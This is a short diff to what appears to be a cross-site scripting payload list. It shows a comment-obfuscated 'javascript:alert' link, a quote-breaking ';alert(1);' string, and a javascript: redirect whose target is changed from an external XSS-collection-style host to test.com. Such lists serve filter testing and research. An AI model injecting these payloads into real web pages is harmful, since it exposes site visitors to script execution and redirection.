@@ -41,7 +41,7 @@
 
 <a/href=javascript:alert/*xasadewf*/(/xss/)>click
 
-<a/href=javascript:window.location.href="https://xss8.cc/wFmb/test.jpg">click
+<a/href=javascript:window.location.href="https://test.com/test.jpg">click
 
 ";alert/*vweve*/(1);"
 
